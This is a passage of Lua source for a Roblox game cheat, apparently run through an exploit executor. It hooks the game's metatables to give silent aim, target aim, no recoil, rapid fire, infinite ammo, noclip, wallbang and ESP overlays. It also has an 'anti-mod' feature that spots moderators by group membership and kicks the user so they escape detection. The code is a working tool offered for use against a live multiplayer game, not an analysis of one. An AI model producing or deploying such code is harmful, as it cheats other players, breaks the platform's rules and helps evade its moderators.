        if isframework(callingScr) and checkArgs(self, index) then
            return
        end
        
        return oldNewIndex(self, index, value)
    end)
    
    mt.__newindex = NoRecoilNewIndex
    setreadonly(mt, true)
end

local function StopNoRecoil()
    if NoRecoilNewIndex then
        local mt = getrawmetatable(game)
        setreadonly(mt, false)
        mt.__newindex = NoRecoilNewIndex
        setreadonly(mt, true)
        NoRecoilNewIndex = nil
    end
end

local SlowdownConnection = nil
local function StartNoSlowdown()
    if SlowdownConnection then return end
    
    local mt = getrawmetatable(game)
    local oldNewIndex = mt.__newindex
    setreadonly(mt, false)
    
    SlowdownConnection = hookfunction(mt.__newindex, function(self, key, value)
        if key == "WalkSpeed" and type(value) == "number" and value < 16 then
            value = 16
        end
        return oldNewIndex(self, key, value)
    end)
    
    mt.__newindex = SlowdownConnection
    setreadonly(mt, true)
end

local function StopNoSlowdown()
    if SlowdownConnection then
        local mt = getrawmetatable(game)
        setreadonly(mt, false)
        mt.__newindex = SlowdownConnection
        setreadonly(mt, true)
        SlowdownConnection = nil
    end
end

local JumpCooldownConnection = nil
local function StartNoJumpCooldown()
    if JumpCooldownConnection then return end
    
    JumpCooldownConnection = RunService.Heartbeat:Connect(function()
        if NoJumpCooldownEnabled and player.Character then
            local humanoid = player.Character:FindFirstChildWhichIsA("Humanoid")
            if humanoid then
                humanoid.UseJumpPower = false
            end
        end
    end)
end

local function StopNoJumpCooldown()
    if JumpCooldownConnection then
        JumpCooldownConnection:Disconnect()
        JumpCooldownConnection = nil
    end
    if player.Character then
        local humanoid = player.Character:FindFirstChildWhichIsA("Humanoid")
        if humanoid then
            humanoid.UseJumpPower = true
        end
    end
end

local function StartNoclip()
    if NoclipConnection then return end
    
    NoclipConnection = RunService.Stepped:Connect(function()
        if NoclipEnabled and player.Character then
            for _, part in pairs(player.Character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
        end
    end)
end

local function StopNoclip()
    if NoclipConnection then
        NoclipConnection:Disconnect()
        NoclipConnection = nil
    end
    if player.Character then
        for _, part in pairs(player.Character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.CanCollide = true
            end
        end
    end
end

local function disableSeat(seat, bool)
    if seat and seat:IsA("Seat") then
        seat.Disabled = bool
    end
end

local function StartNoseat()
    if NoseatEnabled then
        for _, seat in pairs(workspace:GetDescendants()) do
            if seat:IsA("Seat") and not table.find(NoseatSeats, seat) then
                disableSeat(seat, true)
                table.insert(NoseatSeats, seat)
            end
        end
    end
end

local function StopNoseat()
    for _, seat in pairs(NoseatSeats) do
        if seat and seat.Parent then
            disableSeat(seat, false)
        end
    end
    NoseatSeats = {}
end

workspace.DescendantAdded:Connect(function(obj)
    if NoseatEnabled and obj:IsA("Seat") then
        disableSeat(obj, true)
        table.insert(NoseatSeats, obj)
    end
end)

local function ToggleWallbang(Value)
    WallbangEnabled = Value
    pcall(function()
        local replicatedStorage = game:GetService("ReplicatedStorage")
        local mainModule = replicatedStorage:FindFirstChild("MainModule")
        if mainModule then
            local Module = require(mainModule)
            if Value == true and workspace:FindFirstChild("Vehicles") then
                Module.Ignored = {workspace:WaitForChild("Vehicles"), workspace:WaitForChild("MAP"), workspace:WaitForChild("Ignored")}
            else
                if workspace:FindFirstChild("Vehicles") then
                    Module.Ignored = {workspace:WaitForChild("Vehicles"), workspace:WaitForChild("Ignored")}
                end
            end
        end
    end)
end

local function equipAllGuns()
    local char = player.Character
    local backpack = player.Backpack
    if not char or not backpack then return end
    
    for _, tool in ipairs(backpack:GetChildren()) do
        if tool:IsA("Tool") and tool:FindFirstChild("Ammo") then
            tool.Parent = char
        end
    end
end

local function shootAllGuns()
    local char = player.Character
    if not char then return end
    
    for _, tool in ipairs(char:GetChildren()) do
        if tool:IsA("Tool") and tool:FindFirstChild("Ammo") then
            task.spawn(function()
                tool:Activate()
            end)
        end
    end
end

local function setupEquipAll()
    local char = player.Character
    local backpack = player.Backpack
    if not char or not backpack or not EquipAllGunsEnabled then return end
    
    equipAllGuns()
    
    if EquipAllRemovedConnection then EquipAllRemovedConnection:Disconnect() end
    if EquipAllAddedConnection then EquipAllAddedConnection:Disconnect() end
    
    EquipAllRemovedConnection = char.ChildRemoved:Connect(function(child)
        if EquipAllGunsEnabled and child:IsA("Tool") and child:FindFirstChild("Ammo") and (tick() - lastEquipTime) >= 0.5 then
            lastEquipTime = tick()
            task.spawn(function()
                task.wait(0.1)
                equipAllGuns()
            end)
        end
    end)
    
    EquipAllAddedConnection = backpack.ChildAdded:Connect(function(child)
        if EquipAllGunsEnabled and child:IsA("Tool") and child:FindFirstChild("Ammo") then
            child.Parent = char
        end
    end)
end

local function StartEquipAllGuns()
    if EquipAllGunsEnabled then
        setupEquipAll()
    end
end

local function StopEquipAllGuns()
    if EquipAllRemovedConnection then
        EquipAllRemovedConnection:Disconnect()
        EquipAllRemovedConnection = nil
    end
    if EquipAllAddedConnection then
        EquipAllAddedConnection:Disconnect()
        EquipAllAddedConnection = nil
    end
end

local RapidFireConnection = nil
local function StartRapidFire()
    if RapidFireConnection then return end
    
    RapidFireConnection = RunService.RenderStepped:Connect(function()
        local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
        if tool and tool:FindFirstChild("GunScript") and RapidFireEnabled then
            for _, connection in ipairs(getconnections(tool.Activated)) do
                local func = connection.Function
                if func then
                    local funcInfo = debug.getinfo(func)
                    for i = 1, funcInfo.nups do
                        local c = debug.getupvalue(func, i)
                        if type(c) == "number" then
                            if not RapidFireOriginalValues[tool] then
                                RapidFireOriginalValues[tool] = {}
                            end
                            if not RapidFireOriginalValues[tool][i] then
                                RapidFireOriginalValues[tool][i] = c
                            end
                            debug.setupvalue(func, i, 0.00000000000000000001)
                        end
                    end
                end
            end
        end
    end)
end

local function StopRapidFire()
    if RapidFireConnection then
        RapidFireConnection:Disconnect()
        RapidFireConnection = nil
    end
    for tool, values in pairs(RapidFireOriginalValues) do
        if tool and tool:FindFirstChild("GunScript") then
            for _, connection in ipairs(getconnections(tool.Activated)) do
                local func = connection.Function
                if func then
                    for i, originalValue in pairs(values) do
                        debug.setupvalue(func, i, originalValue)
                    end
                end
            end
        end
    end
    RapidFireOriginalValues = {}
end

local function StartInfiniteAmmo()
    if InfiniteAmmoConnection then return end
    
    InfiniteAmmoConnection = RunService.Heartbeat:Connect(function()
        if InfiniteAmmoEnabled then
            local backpack = player.Backpack
            if backpack then
                local ammo = backpack:FindFirstChild("Ammo")
                if ammo then
                    ammo.Value = 2000
                end
            end
            
            if player.Character then
                local ammo = player.Character:FindFirstChild("Ammo")
                if ammo then
                    ammo.Value = 2000
                end
            end
        end
    end)
end

local function StopInfiniteAmmo()
    if InfiniteAmmoConnection then
        InfiniteAmmoConnection:Disconnect()
        InfiniteAmmoConnection = nil
    end
end

local function StartAntiVoid()
    if AntiVoidEnabled then
        workspace.FallenPartsDestroyHeight = -0 / 0
    end
end

local function StopAntiVoid()
    workspace.FallenPartsDestroyHeight = -500
end

local AntiStompConnection = nil
local function StartAntiStomp()
    if AntiStompConnection then return end
    
    AntiStompConnection = Mouse.KeyDown:Connect(function(KeyPressed)
        if AntiStompEnabled and KeyPressed == "p" then
            if player.Character then
                for _, part in pairs(player.Character:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part:Destroy()
                    end
                end
                NotificationSystem:Notify("Anti Stomp Activated - Parts destroyed", 2)
            end
        end
    end)
end

local function StopAntiStomp()
    if AntiStompConnection then
        AntiStompConnection:Disconnect()
        AntiStompConnection = nil
    end
end

local function StartAntiMod()
    if AntiModEnabled then
        _G.originalPrint = print
        print = function(...)
            if print then
                return _G.originalPrint("Anti Mod")
            end
        end
    end
end

local function StopAntiMod()
    if _G.originalPrint then
        print = _G.originalPrint
    end
end

local function CreateLockDetectorGui()
    if AntiLockDetectorGui then
        AntiLockDetectorGui:Destroy()
        AntiLockDetectorGui = nil
    end
    
    AntiLockDetectorGui = Instance.new("ScreenGui")
    AntiLockDetectorGui.Name = "LockDetectorGui"
    AntiLockDetectorGui.Parent = CoreGui
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 300, 0, 400)
    frame.Position = UDim2.new(0, 10, 0, 100)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BackgroundTransparency = 0.1
    frame.BorderSizePixel = 0
    frame.Parent = AntiLockDetectorGui
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(0, 300, 0, 40)
    title.Position = UDim2.new(0, 0, 0, 0)
    title.Text = "Lock Detector (Press T)"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    title.Font = Enum.Font.SourceSansBold
    title.TextSize = 18
    title.Parent = frame
    
    local listFrame = Instance.new("ScrollingFrame")
    listFrame.Size = UDim2.new(0, 300, 0, 320)
    listFrame.Position = UDim2.new(0, 0, 0, 40)
    listFrame.BackgroundTransparency = 1
    listFrame.Parent = frame
    
    local listLayout = Instance.new("UIListLayout")
    listLayout.Padding = UDim.new(0, 5)
    listLayout.Parent = listFrame
    
    local function updateLockDetectorList()
        for _, child in pairs(listFrame:GetChildren()) do
            if child:IsA("TextLabel") then
                child:Destroy()
            end
        end
        
        local text = ""
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= player and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                local rootPart = plr.Character.HumanoidRootPart
                local humanoid = plr.Character:FindFirstChild("Humanoid")
                if humanoid and humanoid.Health > 0 then
                    local xzVelocity = Vector3.new(rootPart.Velocity.X, 0, rootPart.Velocity.Z)
                    local distanceToFloor = (rootPart.Position - workspace:Raycast(rootPart.Position + Vector3.new(0, -2, 0), Vector3.new(0, -1000, 0)).Position).magnitude
                    local manFace = math.sqrt(2 * workspace.Gravity * distanceToFloor) + 20
                    
                    if xzVelocity.magnitude > humanoid.WalkSpeed + 1 or rootPart.Velocity.Y > manFace or rootPart.Velocity.Y < -manFace then
                        local label = Instance.new("TextLabel")
                        label.Size = UDim2.new(0, 290, 0, 30)
                        label.Text = plr.Name .. " (" .. plr.DisplayName .. ")"
                        label.TextColor3 = Color3.fromRGB(255, 100, 100)
                        label.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
                        label.Font = Enum.Font.SourceSans
                        label.TextSize = 14
                        label.Parent = listFrame
                    end
                end
            end
        end
    end
    
    UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if not gameProcessed and AntiLockDetectorEnabled then
            if input.KeyCode == Enum.KeyCode.T then
                updateLockDetectorList()
                NotificationSystem:Notify("Lock Detector Updated", 2)
            end
        end
    end)
    
    frame.Visible = AntiLockDetectorEnabled
end

local function StartAntiLockDetector()
    if AntiLockDetectorEnabled then
        if not AntiLockDetectorGui then
            CreateLockDetectorGui()
        else
            AntiLockDetectorGui.Visible = true
        end
    end
end

local function StopAntiLockDetector()
    if AntiLockDetectorGui then
        AntiLockDetectorGui:Destroy()
        AntiLockDetectorGui = nil
    end
end

local AntiAimViewHook = nil
local MainEvent = ReplicatedStorage:FindFirstChild("MainEvent")
local ToolConnection = nil
local CurrentTool = nil

local function Bypass(Entity)
    Entity.ChildAdded:Connect(function(Child)
        if Child:IsA("Tool") then
            if ToolConnection then ToolConnection:Disconnect() end
            ToolConnection = Child.Activated:Connect(function()
                if AntiAimViewEnabled and MainEvent then
                    MainEvent:FireServer("UpdateMousePos", Mouse.Hit.Position)
                end
            end)
        end
    end)
end

local function StartAntiAimView()
    if AntiAimViewHook then return end
    
    local function Alive(Player)
        return Player and Player.Character and Player.Character:FindFirstChild("Humanoid") and Player.Character:FindFirstChild("Head") or false
    end
    
    if Alive(player) then
        player.Character.Humanoid:UnequipTools()
        Bypass(player.Character)
    end
    
    player.CharacterAdded:Connect(function(Character)
        Bypass(Character)
    end)
    
    local mt = getrawmetatable(game)
    local oldNameCall = mt.__namecall
    setreadonly(mt, false)
    
    AntiAimViewHook = hookfunction(mt.__namecall, function(self, ...)
        local Args = {...}
        local Method = getnamecallmethod()
        
        if not checkcaller() and Method == "FireServer" and self.Name == "MainEvent" and Args[1] == "UpdateMousePos" and AntiAimViewEnabled then
            Args[2] = Mouse.Hit.Position
            return self.FireServer(self, unpack(Args))
        end
        
        return oldNameCall(self, ...)
    end)
    
    mt.__namecall = AntiAimViewHook
    setreadonly(mt, true)
end

local function StopAntiAimView()
    if AntiAimViewHook then
        local mt = getrawmetatable(game)
        setreadonly(mt, false)
        mt.__namecall = AntiAimViewHook
        setreadonly(mt, true)
        AntiAimViewHook = nil
    end
    if ToolConnection then
        ToolConnection:Disconnect()
        ToolConnection = nil
    end
end

local function StartAntiFling()
    if AntiFlingConnection then return end
    
    LastPosition = nil
    
    AntiFlingConnection = RunService.Heartbeat:Connect(function()
        if AntiFlingEnabled and player.Character then
            local primaryPart = player.Character:FindFirstChild("HumanoidRootPart")
            if primaryPart then
                if primaryPart.AssemblyLinearVelocity.Magnitude > 250 or primaryPart.AssemblyAngularVelocity.Magnitude > 50 then
                    if LastPosition then
                        primaryPart.CFrame = LastPosition
                        StarterGui:SetCore("ChatMakeSystemMessage", {
                            Text = "You were flung. Neutralizing velocity.";
                            Color = Color3.fromRGB(255, 0, 0);
                        })
                    end
                elseif primaryPart.AssemblyLinearVelocity.Magnitude < 50 or primaryPart.AssemblyAngularVelocity.Magnitude > 50 then
                    LastPosition = primaryPart.CFrame
                end
            end
        end
    end)
end

local function StopAntiFling()
    if AntiFlingConnection then
        AntiFlingConnection:Disconnect()
        AntiFlingConnection = nil
    end
    LastPosition = nil
end

local function makeDraggable(frame)
    local dragging, dragInput, dragStart, startPos
    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position

            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            dragInput = input
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
                startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end

local function updateDsAntiModList()
    if not DsAntiModPlayerList then return end
    
    for _, child in pairs(DsAntiModPlayerList:GetChildren()) do
        if child:IsA("Frame") then
            child:Destroy()
        end
    end
    
    local yPos = 0
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr:IsInGroup(GroupId) then
            local playerFrame = Instance.new("Frame")
            playerFrame.Size = UDim2.new(0, 250, 0, 60)
            playerFrame.Position = UDim2.new(0, 0, 0, yPos)
            playerFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
            playerFrame.BorderSizePixel = 0
            playerFrame.Parent = DsAntiModPlayerList

            local imageLabel = Instance.new("ImageLabel")
            imageLabel.Size = UDim2.new(0, 50, 0, 50)
            imageLabel.Position = UDim2.new(0, 5, 0, 5)
            imageLabel.Image = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=150&height=150&format=png"
            imageLabel.BackgroundTransparency = 1
            imageLabel.Parent = playerFrame

            local nameLabel = Instance.new("TextLabel")
            nameLabel.Size = UDim2.new(0, 185, 0, 50)
            nameLabel.Position = UDim2.new(0, 60, 0, 5)
            nameLabel.Text = plr.Name
            nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
            nameLabel.BackgroundTransparency = 1
            nameLabel.Font = Enum.Font.SourceSans
            nameLabel.TextSize = 18
            nameLabel.Parent = playerFrame

            yPos = yPos + 65

            if DsAntiModKickToggle then
                player:Kick("Anti-Mod: A moderator has joined your game, we've kicked you for your own safety.")
            end
        end
    end
end

local function CreateDsAntiModGui()
    if DsAntiModGui then
        DsAntiModGui:Destroy()
        DsAntiModGui = nil
    end
    
    DsAntiModGui = Instance.new("ScreenGui")
    DsAntiModGui.Name = "DsAntiModGui"
    DsAntiModGui.ResetOnSpawn = false
    DsAntiModGui.Parent = CoreGui

    DsAntiModFrame = Instance.new("Frame")
    DsAntiModFrame.Size = UDim2.new(0, 250, 0, 400)
    DsAntiModFrame.Position = UDim2.new(0, 0, 0, 100)
    DsAntiModFrame.BackgroundTransparency = 0.3
    DsAntiModFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    DsAntiModFrame.BorderSizePixel = 0
    DsAntiModFrame.Visible = true
    DsAntiModFrame.Parent = DsAntiModGui

    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(0, 250, 0, 50)
    titleLabel.Position = UDim2.new(0, 0, 0, 0)
    titleLabel.Text = "MODS IN THE SERVER"
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.TextSize = 24
    titleLabel.Parent = DsAntiModFrame

    DsAntiModPlayerList = Instance.new("ScrollingFrame")
    DsAntiModPlayerList.Size = UDim2.new(0, 250, 0, 300)
    DsAntiModPlayerList.Position = UDim2.new(0, 0, 0, 50)
    DsAntiModPlayerList.BackgroundTransparency = 1
    DsAntiModPlayerList.Parent = DsAntiModFrame

    local listLayout = Instance.new("UIListLayout")
    listLayout.Padding = UDim.new(0, 5)
    listLayout.Parent = DsAntiModPlayerList

    DsAntiModToggleButton = Instance.new("TextButton")
    DsAntiModToggleButton.Size = UDim2.new(0, 250, 0, 50)
    DsAntiModToggleButton.Position = UDim2.new(0, 0, 0, 350)
    DsAntiModToggleButton.Text = "Kick Off"
    DsAntiModToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    DsAntiModToggleButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    DsAntiModToggleButton.Font = Enum.Font.SourceSansBold
    DsAntiModToggleButton.TextSize = 18
    DsAntiModToggleButton.Parent = DsAntiModFrame

    DsAntiModToggleGuiButton = Instance.new("TextButton")
    DsAntiModToggleGuiButton.Size = UDim2.new(0, 50, 0, 50)
    DsAntiModToggleGuiButton.Position = UDim2.new(0, 0, 0, 0)
    DsAntiModToggleGuiButton.Text = "Toggle"
    DsAntiModToggleGuiButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    DsAntiModToggleGuiButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    DsAntiModToggleGuiButton.Font = Enum.Font.SourceSansBold
    DsAntiModToggleGuiButton.TextSize = 14
    DsAntiModToggleGuiButton.Parent = DsAntiModGui

    makeDraggable(DsAntiModFrame)

    DsAntiModToggleGuiButton.MouseButton1Click:Connect(function()
        DsAntiModFrame.Visible = not DsAntiModFrame.Visible
    end)

    DsAntiModToggleButton.MouseButton1Click:Connect(function()
        DsAntiModKickToggle = not DsAntiModKickToggle
        DsAntiModToggleButton.Text = DsAntiModKickToggle and "Kick On" or "Kick Off"
        if DsAntiModKickToggle then
            updateDsAntiModList()
        end
    end)
end

local function StartDsAntiMod()
    if DsAntiModEnabled then
        if not DsAntiModGui then
            CreateDsAntiModGui()
        else
            DsAntiModGui.Visible = true
        end
        updateDsAntiModList()
        
        if not DsAntiModPlayerAdded then
            DsAntiModPlayerAdded = Players.PlayerAdded:Connect(function(plr)
                if DsAntiModEnabled and plr:IsInGroup(GroupId) then
                    StarterGui:SetCore("SendNotification", {
                        Title = "MOD ALERT",
                        Text = plr.Name .. " Just joined, leave the game for your safety.",
                        Duration = 5,
                    })
                    updateDsAntiModList()
                end
            end)
        end
        
        if not DsAntiModPlayerRemoving then
            DsAntiModPlayerRemoving = Players.PlayerRemoving:Connect(function()
                updateDsAntiModList()
            end)
        end
    end
end

local function StopDsAntiMod()
    if DsAntiModGui then
        DsAntiModGui:Destroy()
        DsAntiModGui = nil
    end
    if DsAntiModPlayerAdded then
        DsAntiModPlayerAdded:Disconnect()
        DsAntiModPlayerAdded = nil
    end
    if DsAntiModPlayerRemoving then
        DsAntiModPlayerRemoving:Disconnect()
        DsAntiModPlayerRemoving = nil
    end
end

local function createCorner()
    local line = Drawing.new("Line")
    line.Color = Color3.fromRGB(255, 255, 255)
    line.Thickness = 2
    line.Visible = false
    return line
end

local function createTracer()
    local line = Drawing.new("Line")
    line.Color = Color3.fromRGB(255, 255, 255)
    line.Thickness = 1
    line.Visible = false
    return line
end

local function createHealthBar()
    local bar = Drawing.new("Line")
    bar.Thickness = 4
    bar.Visible = false
    return bar
end

local function addESP(plr)
    if plr == Players.LocalPlayer or ESP[plr] then return end
    ESP[plr] = {
        Corners = {
            TL1 = createCorner(), TL2 = createCorner(),
            TR1 = createCorner(), TR2 = createCorner(),
            BL1 = createCorner(), BL2 = createCorner(),
            BR1 = createCorner(), BR2 = createCorner(),
        },
        Tracer = createTracer(),
        HealthBar = createHealthBar()
    }
end

local function removeESP(plr)
    if ESP[plr] then
        for _, obj in pairs(ESP[plr]) do
            if typeof(obj) == "table" then
                for _, v in pairs(obj) do v:Remove() end
            else
                obj:Remove()
            end
        end
        ESP[plr] = nil
    end
end

for _, p in pairs(Players:GetPlayers()) do addESP(p) end
Players.PlayerAdded:Connect(addESP)
Players.PlayerRemoving:Connect(removeESP)

local function getBoundingBox(character)
    local minX, minY = math.huge, math.huge
    local maxX, maxY = -math.huge, -math.huge
    local any = false
    for _, part in pairs(character:GetChildren()) do
        if part:IsA("BasePart") then
            local cf, size = part.CFrame, part.Size
            local corners = {
                Vector3.new(-1,-1,-1), Vector3.new(1,-1,-1),
                Vector3.new(-1,1,-1), Vector3.new(1,1,-1),
                Vector3.new(-1,-1,1), Vector3.new(1,-1,1),
                Vector3.new(-1,1,1), Vector3.new(1,1,1),
            }
            for _, c in pairs(corners) do
                local world = cf * (size * 0.5 * c)
                local screen, vis = Camera:WorldToViewportPoint(world)
                if vis then
                    any = true
                    minX = math.min(minX, screen.X)
                    minY = math.min(minY, screen.Y)
                    maxX = math.max(maxX, screen.X)
                    maxY = math.max(maxY, screen.Y)
                end
            end
        end
    end
    if not any then return end
    return Vector2.new(minX, minY), Vector2.new(maxX-minX, maxY-minY)
end

local function SetupSilentAimVisuals()
    SilentCircle = Drawing.new("Circle")
    SilentCircle.Visible = false
    SilentCircle.Color = Color3.fromRGB(255, 255, 255)
    SilentCircle.Transparency = 0.9
    SilentCircle.Thickness = 1.2
    SilentCircle.NumSides = 100
    SilentCircle.Radius = 80
    SilentCircle.Filled = false

    SilentHighlight = Instance.new("Highlight")
    SilentHighlight.FillColor = Color3.fromRGB(255, 255, 255)
    SilentHighlight.OutlineColor = Color3.fromRGB(255,255,255)
    SilentHighlight.FillTransparency = 0.4
    SilentHighlight.OutlineTransparency = 0
    SilentHighlight.Enabled = false
end

SetupSilentAimVisuals()

local solve = function(angle, radius)
    return Vector2.new(
        math.sin(math.rad(angle)) * radius,
        math.cos(math.rad(angle)) * radius
    )
end

local NameCall
NameCall = hookmetamethod(game, "__namecall", function(Self, ...)
    if checkcaller() then return NameCall(Self, ...) end
    local Arguments = {...}
    local Method = getnamecallmethod()
    
    if Settings.TargetAim and TargetPlayer and Locked and Victim and math.random(100) <= Settings.TargetAimAccuracy then
        local aimPart = TargetPlayer.AimPart
        local aimPosition = TargetPlayer.AimPosition
        
        if not aimPart or not aimPosition then
            return NameCall(Self, ...)
        end
        
        if Settings.TargetAimMethod == "FireServer" then
            if Method == "FireServer" and Self.ClassName == "RemoteEvent" then
                if type(Arguments[1]) == "string" then
                    if typeof(Arguments[2]) == "Vector3" then
                        Arguments[2] = aimPosition
                    elseif typeof(Arguments[2]) == "table" then
                        for Index, Value in Arguments[2] do
                            Arguments[2][Index] = typeof(Value) == "CFrame" and CFrame.new(aimPosition) or typeof(Value) == "Vector3" and aimPosition
                        end
                    end
                end
                return NameCall(Self, unpack(Arguments))
            end
        elseif Settings.TargetAimMethod == "Raycast" then
            if Self == workspace and Method:find("cast") then
                if Method == "Raycast" then
                    Arguments[2] = (aimPart.Position - Arguments[1]).Unit * 10000
                elseif Method == "Shapecast" then
                    Arguments[2] = (aimPart.Position - Arguments[1].Position).Unit * 10000
                elseif Method == "Spherecast" then
                    Arguments[3] = (aimPart.Position - Arguments[1]).Unit * 10000
                elseif Method == "Blockcast" then
                    Arguments[3] = (aimPart.Position - Arguments[1].Position).Unit * 10000
                end
                return NameCall(Self, unpack(Arguments))
            end
        end
    end
    
    return NameCall(Self, ...)
end)

RunService.PostSimulation:Connect(function()
    if not Settings.CrosshairEnabled or not getgenv().crosshair.enabled then
        for i = 1, 8 do
            drawings.crosshair[i].Visible = false
        end
        drawings.text.Visible = false
        return
    end

    local position = (
        getgenv().crosshair.mode == 'center' and Camera.ViewportSize / 2 or
        getgenv().crosshair.mode == 'mouse' and UserInputService:GetMouseLocation() or
        getgenv().crosshair.position
    )

    drawings.text.Visible = true
    drawings.text.Position = position + Vector2.new(-drawings.text.TextBounds.X / 2, getgenv().crosshair.radius + getgenv().crosshair.length + 15)

    for idx = 1, 4 do
        local outline = drawings.crosshair[idx]
        local inline = drawings.crosshair[idx + 4]

        local angle = (idx - 1) * 90
        local length = getgenv().crosshair.length

        inline.Visible = true
        inline.Color = getgenv().crosshair.color
        inline.From = position + solve(angle, getgenv().crosshair.radius)
        inline.To = position + solve(angle, getgenv().crosshair.radius + length)
        inline.Thickness = getgenv().crosshair.width

        outline.Visible = true
        outline.Color = Color3.fromRGB(0, 0, 0)
        outline.From = position + solve(angle, getgenv().crosshair.radius - 1)
        outline.To = position + solve(angle, getgenv().crosshair.radius + length + 1)
        outline.Thickness = getgenv().crosshair.width + 1.5
    end
end)

RunService.Heartbeat:Connect(function()
    if not Settings.SilentAim then
        CachedTarget = nil
        CachedPartSilent = nil
        ResolvedPosition = nil
        return
    end
    CachedTarget = GetClosestToCenter()
    if CachedTarget and CachedTarget.Character then
        CachedPartSilent = GetBestPart(CachedTarget.Character)
    else
        CachedPartSilent = nil
        ResolvedPosition = nil
    end
end)

RunService.Heartbeat:Connect(function()
    if Settings.TargetAim and Locked and Victim and Victim.Character then
        local aimPart = Victim.Character:FindFirstChild(Settings.HitPart) or Victim.Character:FindFirstChild("HumanoidRootPart")
        if aimPart then
            TargetPlayer = {
                AimPart = aimPart,
                AimPosition = aimPart.Position + Vector3.new(aimPart.Velocity.X * Settings.Prediction, aimPart.Velocity.Y * Settings.Prediction, aimPart.Velocity.Z * Settings.Prediction)
            }
        else
            TargetPlayer = nil
        end
    else
        TargetPlayer = nil
    end
end)

RunService.Heartbeat:Connect(function()
    if Settings.TargetStrafe and Locked and Victim and Victim.Character and player.Character then
        if not StrafeConnection then
            StartStrafe()
        end
    else
        if StrafeConnection then
            StopStrafe()
        end
    end
end)

RunService.RenderStepped:Connect(function()
    if SilentCircle then
        SilentCircle.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
        SilentCircle.Visible = Settings.SilentAimFOVVisible and Settings.SilentAim
        SilentCircle.Radius = Settings.SilentAimFOV
    end
    
    if SilentHighlight then
        if CachedTarget and CachedTarget.Character and Settings.SilentAim then
            SilentHighlight.Adornee = CachedTarget.Character
            SilentHighlight.Enabled = true
        else
            SilentHighlight.Enabled = false
        end
    end
    
    for plr, data in pairs(ESP) do
        local char = plr.Character
        local corners = data.Corners
        local tracer = data.Tracer
        local healthBar = data.HealthBar
        if char and char:FindFirstChild("HumanoidRootPart") then
            local pos, size = getBoundingBox(char)
            if pos and size then
                local x, y = pos.X, pos.Y
                local w, h = size.X, size.Y
                local l = math.clamp(w * 0.25, 6, 20)
                for _, c in pairs(corners) do 
                    c.Color = ESPSettings.BoxColor
                    c.Visible = ESPSettings.Boxes 
                end
                corners.TL1.From = Vector2.new(x, y)
                corners.TL1.To = Vector2.new(x + l, y)
                corners.TL2.From = Vector2.new(x, y)
                corners.TL2.To = Vector2.new(x, y + l)
                corners.TR1.From = Vector2.new(x + w, y)
                corners.TR1.To = Vector2.new(x + w - l, y)
                corners.TR2.From = Vector2.new(x + w, y)
                corners.TR2.To = Vector2.new(x + w, y + l)
                corners.BL1.From = Vector2.new(x, y + h)
                corners.BL1.To = Vector2.new(x + l, y + h)
                corners.BL2.From = Vector2.new(x, y + h)
                corners.BL2.To = Vector2.new(x, y + h - l)
                corners.BR1.From = Vector2.new(x + w, y + h)
                corners.BR1.To = Vector2.new(x + w - l, y + h)
                corners.BR2.From = Vector2.new(x + w, y + h)
                corners.BR2.To = Vector2.new(x + w, y + h - l)
                local hum = char:FindFirstChildWhichIsA("Humanoid")
                if hum and ESPSettings.HealthBar then
                    local hp = math.clamp(hum.Health / hum.MaxHealth, 0, 1)
                    local hbHeight = h * hp
                    local hbY = y + h - hbHeight
                    healthBar.From = Vector2.new(x - 5, y + h)
                    healthBar.To = Vector2.new(x - 5, hbY)
                    local baseColor = ESPSettings.HealthBarColor
                    if hp > 0.5 then
                        healthBar.Color = Color3.new(baseColor.R, baseColor.G, baseColor.B)
                    elseif hp > 0.25 then
                        healthBar.Color = Color3.new(1, 1, 0)
                    else
                        healthBar.Color = Color3.new(1, 0, 0)
                    end
                    healthBar.Visible = true
                else
                    healthBar.Visible = false
                end
                if ESPSettings.Tracers then
                    local root = char:FindFirstChild("HumanoidRootPart")
                    local screenPos, visible = Camera:WorldToViewportPoint(root.Position)
                    if visible then
                        tracer.From = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y)
                        tracer.To = Vector2.new(screenPos.X, screenPos.Y)
                        tracer.Color = ESPSettings.TracerColor
                        tracer.Visible = true
                    else
                        tracer.Visible = false
                    end
                else
                    tracer.Visible = false
                end
            else
                for _, c in pairs(corners) do c.Visible = false end
                tracer.Visible = false
                healthBar.Visible = false
            end
        else
            for _, c in pairs(corners) do c.Visible = false end
            tracer.Visible = false
